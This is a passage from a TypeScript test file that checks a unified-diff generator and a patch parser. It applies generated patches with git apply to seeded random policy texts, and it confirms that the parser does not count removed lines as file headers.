    cases.forEach((c, i) => writeFileSync(join(dir, `f${i}.md`), c.before));
    writeFileSync(join(dir, 'all.patch'), cases.map((c, i) => c.patch.replaceAll('policy.md', `f${i}.md`)).join(''));
    execFileSync('git', ['-c', 'core.autocrlf=false', 'apply', '--whitespace=nowarn', 'all.patch'], { cwd: dir, stdio: 'pipe' });
    return cases.map((_, i) => readFileSync(join(dir, `f${i}.md`), 'utf8'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

/** The same numbers every run. */
function seeded(seed: number) {
  return (n: number) => {
    seed = (Math.imul(seed, 1103515245) + 12345) >>> 0;
    return (seed >>> 8) % n;
  };
}

describe('unifiedDiff', () => {
  it('writes a patch git apply turns into the rewrite, whatever the file ends with', () => {
    // The last lines of a policy with no final newline taken away: the line left last has no newline,
    // where git would have read the shared line in front of the change as having one.
    const policy = { before: 'B\nB\nB', after: 'B' };
    const cases = [policy, { before: 'Rule one.\nRule two.', after: 'Rule one.\nRule two.\nRule three.' }, { before: 'a\nb\nc\n', after: 'a\nb' }, { before: 'x\ny\n', after: 'z\ny' }, { before: 'x\ny', after: 'z\ny\n' }];
    const rnd = seeded(7);
    const alphabet = ['', 'A', 'B', 'Rule one.', 'Escalate refunds.', ' ', 'B\r'];
    const text = (n: number) => Array.from({ length: n }, () => alphabet[rnd(alphabet.length)]).join('\n');
    while (cases.length < 600) {
      const before = text(1 + rnd(8)) + (rnd(3) ? '' : '\n');
      const at = rnd(before.length + 1);
      const to = at + rnd(before.length - at + 1);
      const after = before.slice(0, at) + (rnd(3) ? text(rnd(3)) : '') + (rnd(2) ? '\n' : '') + before.slice(to);
      if (before.trim() && after.trim() && after !== before) cases.push({ before, after });
    }
    const got = gitApplied(cases.map((c) => ({ before: c.before, patch: unifiedDiff('policy.md', c.before, c.after) })));
    expect(got[0]).toBe('B');
    cases.forEach((c, i) => expect(got[i], JSON.stringify(c)).toBe(c.after));
  });

  it("writes a patch the check takes for a repair's rewrite at the end of a file without a newline", () => {
    const rnd = seeded(11);
    const alphabet = ['A', 'B', 'Rule one.', 'Rule two.', 'Escalate refunds.'];
    const cases: Array<{ content: string; c: RepairCandidate; patched: string }> = [];
    while (cases.length < 400) {
      const lines = Array.from({ length: 1 + rnd(10) }, () => alphabet[rnd(alphabet.length)]);
      const content = lines.join('\n') + (rnd(2) ? '' : '\n');
      // A span of whole lines from some line to the end of the file, rewritten to fewer, more or other lines.
      const first = rnd(lines.length);
      const offset = lines.slice(0, first).join('\n').length + (first ? 1 : 0);
      const before = lines.slice(first).join('\n');
      const after = Array.from({ length: 1 + rnd(3) }, () => alphabet[rnd(alphabet.length)]).join('\n');
      if (after === before) continue;
      const c = candidate({ file: 'policy.md', offset, before, after });
      cases.push({ content, c, patched: applyEdit(content, { offset, text: before }, after) });
    }
    const reports = cases.map(({ content, c }) => report(c, content));
    reports.forEach((r, i) => expect(repairPatchProblem(r), JSON.stringify(cases[i].c)).toBeNull());
    const got = gitApplied(cases.map((x, i) => ({ before: x.content, patch: reports[i].patch })));
    cases.forEach((x, i) => expect(got[i], JSON.stringify(x.c)).toBe(x.patched));
  });
});

describe('patchFiles', () => {
  it('names every file a patch touches, and takes no removed line for a header', () => {
    expect(patchFiles(unifiedDiff('agent.mjs', 'a\n-- b\n', 'a\n--- c\n'))).toEqual(['agent.mjs']);
    expect(patchFiles(['diff --git a/x y.mjs b/x y.mjs', '--- a/x y.mjs', '+++ b/x y.mjs', '@@ -1 +1 @@', '--- a/secret', '+++ b/secret', ''].join('\n'))).toEqual(['x y.mjs']);
    expect(patchFiles(['diff --git a/a.mjs b/b.mjs', 'rename from a.mjs', 'rename to b.mjs', 'diff --git a/n.txt b/n.txt', 'new file mode 100644', '--- /dev/null', '+++ b/n.txt', '@@ -0,0 +1 @@', '+n', ''].join('\n'))).toEqual(['a.mjs', 'b.mjs', 'n.txt']);
  });
});
